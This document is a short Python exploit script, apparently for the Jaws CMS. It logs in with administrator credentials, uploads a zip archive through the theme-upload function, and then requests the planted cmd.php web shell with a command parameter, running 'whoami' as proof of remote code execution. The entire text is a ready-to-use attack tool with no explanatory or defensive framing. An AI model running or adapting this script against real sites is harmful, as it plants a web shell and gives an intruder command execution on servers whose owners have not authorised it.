import requests
import random
import sys
if (len(sys.argv) <4):
	print("[+]Usage python jaws-rce2.py http://victim.com/ admin admin")
else:
	username = sys.argv[2]
	password = sys.argv[3]

	s = requests.Session()

	inputurl = sys.argv[1]
	loginurl = inputurl
	#create session for login
	r = s.get(loginurl)
	data = {"reqGadget":"Users", "reqAction":"Authenticate","referrer":"","loginstep":"1","defaults":"","username":username,"password":password}
	r = s.post(loginurl, data=data)


	uploadurl = inputurl+"admin.php"
	#request for upload shell
	data = {"reqGadget":"Tms", "reqAction":"UploadTheme"}
	data2={"theme_upload":open('cmd.zip', 'rb')}
	r3 = s.post(uploadurl, files=data2,data=data)


	#execute shell with whoami for example and PoC
	finalurl = inputurl+"data/themes/cmd.php?c=whoami"


	print("Shell Location ===",finalurl)

	r5 = s.get(finalurl)

	print(r5.text)